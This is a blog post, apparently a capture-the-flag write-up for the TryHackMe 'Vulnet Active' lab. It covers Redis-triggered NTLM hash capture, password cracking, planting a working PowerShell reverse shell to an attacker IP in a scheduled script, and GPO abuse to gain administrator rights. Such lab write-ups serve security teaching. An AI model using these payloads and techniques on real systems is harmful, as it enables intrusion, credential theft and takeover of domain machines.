<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="blog @ zexion.dev" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="blog @ zexion.dev" /> <title> Vulnet Active - Try Hack Me - blog @ zexion.dev </title> <link rel="alternate" href="http://localhost:4000/VulnetActive/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/VulnetActive/" /> <meta name="description" content="Medium rated machine from Try Hack Me" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Vulnet Active - Try Hack Me | zexionx00" /> <meta property="og:title" content="Vulnet Active - Try Hack Me | zexionx00" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/VulnetActive/" /> <meta property="og:description" content="Medium rated machine from Try Hack Me" /> <meta property="og:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Vulnet Active - Try Hack Me | zexionx00" /> <meta name="twitter:url" content="http://localhost:4000/VulnetActive/" /> <meta name="twitter:site" content="@zexionx00" /> <meta name="twitter:creator" content="@zexionx00" /> <meta name="twitter:description" content="Medium rated machine from Try Hack Me" /> <meta name="twitter:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="blog @ zexion.dev" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#thm">THM</a> </span> </div> <h1 class="header-title" itemprop="headline">Vulnet Active - Try Hack Me</h1> <div class="post-meta"> <time datetime="2021-11-07T00:00:07+00:00" itemprop="datePublished"> Nov 07, 2021 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">zexionx00</span> </span> <time hidden datetime="" itemprop="dateModified"> Nov 07, 2021 </time> <span hidden itemprop="publisher" itemtype="Person">zexionx00</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><figure> <img src="/assets/img/active/active.png" alt="active" /> <figcaption> Vulnet Active - Try Hack Me </figcaption> </figure> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <figure> <img src="/assets/img/active/active.png" alt="active" /> <figcaption> Vulnet Active - Try Hack Me </figcaption> </figure> <h1 id="introduction"> <a href="#introduction" class="anchor-head"></a> Introduction </h1> <p><a href="https://tryhackme.com/room/vulnnetactive" target="_blank" rel="noopener nofollow"> Vulnet Active</a> is a room from Try Hack Me which includes a request from redis server to capture the hash of enterprise-securityâ€™s user. We can access the SMB with those creds and there is a powershell script which looks like a scheduled task. So, we change script to give us a reverse shell. For root, we run bloodhound and find that we have GenericWrite privileges on one of the GPO. So, we run <a href="https://github.com/byronkg/SharpGPOAbuse" target="_blank" rel="noopener nofollow">SharpGPOAbuse.exe</a> to escalate our user to Administrator.</p> <h1 id="nmap"> <a href="#nmap" class="anchor-head"></a> Nmap </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.91 scan initiated Mon Jan 31 04:12:07 2022 as: nmap -p53,135,139,445,464,6379,49665,49667,49669,49670,49683,49696,49722 -sC -sV -vv -oA nmap/ports 10.10.248.175</span>
Nmap scan report <span class="k">for </span>10.10.248.175
Host is up, received echo-reply ttl 127 <span class="o">(</span>0.36s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-31 04:12:07 EST <span class="k">for </span>104s

PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
6379/tcp  open     redis         syn-ack ttl 127 Redis key-value store 2.8.2402
49665/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp filtered unknown       no-response
49669/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49683/tcp filtered unknown       no-response
49696/tcp filtered unknown       no-response
49722/tcp filtered unknown       no-response
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking <span class="k">for </span>Conficker.C or higher...
|   Check 1 <span class="o">(</span>port 17126/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 2 <span class="o">(</span>port 57239/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 3 <span class="o">(</span>port 56820/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 4 <span class="o">(</span>port 17011/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2022-01-31T09:13:16
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Jan 31 04:13:51 2022 -- 1 IP address (1 host up) scanned in 104.12 seconds</span></code></pre></figure> <h1 id="smb"> <a href="#smb" class="anchor-head"></a> SMB </h1> <p>There is no access on guest/anonymous user but the domain is leaked.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% crackmapexec smb 10.10.248.175 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:VULNNET-BC3TCK1<span class="o">)</span> <span class="o">(</span>domain:vulnnet.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span>-] vulnnet.local<span class="se">\:</span> STATUS_ACCESS_DENIED </code></pre></figure> <h1 id="redis"> <a href="#redis" class="anchor-head"></a> Redis </h1> <p>Checking for redis in hacktricks, we find <a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html" target="_blank" rel="noopener nofollow">LUA sandbox bypass</a>, which describes about hacking redis via HTTP Requests. So, letâ€™s try to connect from redisâ€™ server and start a responder to catch the hash.</p> <h1 id="ntlm-hash"> <a href="#ntlm-hash" class="anchor-head"></a> NTLM Hash </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% redis-cli <span class="nt">-h</span> 10.10.248.175
10.10.248.175:6379&gt; <span class="nb">eval</span> <span class="s2">"dofile('//10.18.25.218/zex')"</span> 0
<span class="o">(</span>error<span class="o">)</span> ERR Error running script <span class="o">(</span>call to f_648174d937245e390c24fab91e2ed0b1f39af8fa<span class="o">)</span>: @user_script:1: cannot open //10.18.25.218/zex: Permission denied 
<span class="o">(</span>9.38s<span class="o">)</span>
10.10.248.175:6379&gt; 

<span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0

<span class="o">[</span> <span class="nt">-----</span> SNIP <span class="nt">-----</span><span class="o">]</span>
<span class="o">[</span>SMB] NTLMv2-SSP Client   : 10.10.248.175
<span class="o">[</span>SMB] NTLMv2-SSP Username : VULNNET<span class="se">\e</span>nterprise-security
<span class="o">[</span>SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:8900f350aacb86ba:59A8E887432500EC2651A0AF3CC90A4B:010100000000000080FDBB345B16D801AB035CD0D5C01EF400000000020008004E00440032004F0001001E00570049004E002D004A005900510053004F0037004D00460043004C00550004003400570049004E002D004A005900510053004F0037004D00460043004C0055002E004E00440032004F002E004C004F00430041004C00030014004E00440032004F002E004C004F00430041004C00050014004E00440032004F002E004C004F00430041004C000700080080FDBB345B16D8010600040002000000080030003000000000000000000000000030000094A3656A068C685B12C2A013265CAE9AD297CB1BBDA9BDAFC4BCF142B0AFCE190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310038002E00320035002E003200310038000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Skipping previously captured <span class="nb">hash </span><span class="k">for </span>VULNNET<span class="se">\e</span>nterprise-security

% john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash 
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
sand_0873959498  <span class="o">(</span>enterprise-security<span class="o">)</span>
1g 0:00:00:01 DONE <span class="o">(</span>2022-01-31 04:34<span class="o">)</span> 0.5780g/s 2320Kp/s 2320Kc/s 2320KC/s sandoval69..sand36
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed</code></pre></figure> <p>And now we access to SMB, with those creds. We find a powershell script which looks like a scheduled job. So, letâ€™s change it to give ourself a reverse using nishang one line powershell reverse shell.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">crackmapexec smb 10.10.248.175 <span class="nt">-u</span> <span class="s1">'enterprise-security'</span> <span class="nt">-p</span> <span class="s1">'sand_0873959498'</span> <span class="nt">--shares</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:VULNNET-BC3TCK1<span class="o">)</span> <span class="o">(</span>domain:vulnnet.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span>+] vulnnet.local<span class="se">\e</span>nterprise-security:sand_0873959498 
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="o">[</span>+] Enumerated shares
SMB         10.10.248.175   445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.10.248.175   445    VULNNET-BC3TCK1  <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.248.175   445    VULNNET-BC3TCK1  ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.248.175   445    VULNNET-BC3TCK1  C<span class="nv">$ </span>                             Default share
SMB         10.10.248.175   445    VULNNET-BC3TCK1  Enterprise-Share READ            
SMB         10.10.248.175   445    VULNNET-BC3TCK1  IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.248.175   445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         10.10.248.175   445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share</code></pre></figure> <h1 id="reverse-shell"> <a href="#reverse-shell" class="anchor-head"></a> Reverse Shell </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% smbclient <span class="se">\\\\</span>vulnnet.local<span class="se">\\</span>Enterprise-Share <span class="nt">-U</span> enterprise-security
Enter WORKGROUP<span class="se">\e</span>nterprise-security<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Feb 23 17:45:41 2021
  ..                                  D        0  Tue Feb 23 17:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 19:33:18 2021

                9558271 blocks of size 4096. 5130697 blocks available
smb: \&gt; get PurgeIrrelevantData_1826.ps1 
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \&gt; ^C

% cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue

% vi PurgeIrrelevantData_1826.ps1 

% cat PurgeIrrelevantData_1826.ps1
$client = New-Object System.Net.Sockets.TCPClient("10.18.25.218",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</span></code></pre></figure> <p>And now we wait for reverse to come back.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% smbclient <span class="se">\\\\</span>vulnnet.local<span class="se">\\</span>Enterprise-Share <span class="nt">-U</span> enterprise-security
Enter WORKGROUP<span class="se">\e</span>nterprise-security<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \&gt; put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \&gt; put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \&gt; ^C

% rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.18.25.218] from (UNKNOWN) [10.10.248.175] 50033
whoami
vulnnet\enterprise-security
PS C:\Users\enterprise-security\Downloads&gt; </span></code></pre></figure> <h1 id="gpo"> <a href="#gpo" class="anchor-head"></a> GPO </h1> <p>Since this is AD, we run bloodhound to check permissions and we find out that we have generic write permission to one of GPO. Letâ€™s use SharpGPOAbuse.exe to update our user to Administrator.</p> <figure> <img src="/assets/img/active/blood.png" alt="Bloddhound" /> <figcaption> Bloodhound </figcaption> </figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-security<span class="se">\D</span>ownloads&gt;.<span class="se">\S</span>harpGPOAbuse.exe <span class="nt">--AddComputerTask</span> <span class="nt">--TaskName</span> <span class="s2">"PissOFF"</span> <span class="nt">--Author</span> vulnnet<span class="se">\a</span>dministrator <span class="nt">--Command</span> <span class="s2">"cmd.exe"</span> <span class="nt">--Arguments</span> <span class="s2">"/c net localgroup administrators enterprise-security /add"</span> <span class="nt">--GPOName</span> <span class="s2">"SECURITY-POL-VN"</span> <span class="nt">--Force</span>
<span class="o">[</span>+] Domain <span class="o">=</span> vulnnet.local
<span class="o">[</span>+] Domain Controller <span class="o">=</span> VULNNET-BC3TCK1SHNQ.vulnnet.local
<span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>vulnnet,DC<span class="o">=</span><span class="nb">local</span>
<span class="o">[</span>+] GUID of <span class="s2">"SECURITY-POL-VN"</span> is: <span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
<span class="o">[</span>+] Creating file <span class="se">\\</span>vulnnet.local<span class="se">\S</span>ysVol<span class="se">\v</span>ulnnet.local<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\S</span>cheduledTasks<span class="se">\S</span>cheduledTasks.xml
<span class="o">[</span>+] versionNumber attribute changed successfully
<span class="o">[</span>+] The version number <span class="k">in </span>GPT.ini was increased successfully.
<span class="o">[</span>+] The GPO was modified to include a new immediate task. Wait <span class="k">for </span>the GPO refresh cycle.
<span class="o">[</span>+] Done!</code></pre></figure> <p>And, now we can login as Administrator with the same creds.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">psexec.py enterprise-security:sand_0873959498@10.10.193.68
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.193.68.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file lhSSLqub.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.193.68.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Dxat on 10.10.193.68.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Dxat.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1757]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
The system cannot find the file specified.

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

02/23/2021  08:27 PM    &lt;DIR&gt;          <span class="nb">.</span>
02/23/2021  08:27 PM    &lt;DIR&gt;          ..
02/23/2021  08:27 PM                37 system.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             37 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  21,137,522,688 bytes free

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>system.txt
THM<span class="o">{</span>d540c0645975900e5bb9167aa431fc9b<span class="o">}</span>
C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; </code></pre></figure> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Forge/" > <div class="nav-arrow">Previous</div> <span class="post-title">Forge - Hack The Box</span> </a> <a class="post-nav-item post-nav-next" href="/CrocCrew/"> <div class="nav-arrow">Next</div> <span class="post-title">Crocc Crew - Try Hack Me</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/thanks">ack.</a> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2022</span> <small class="footer_copyright"> <!-- KlisÃ© Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisÃ©</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
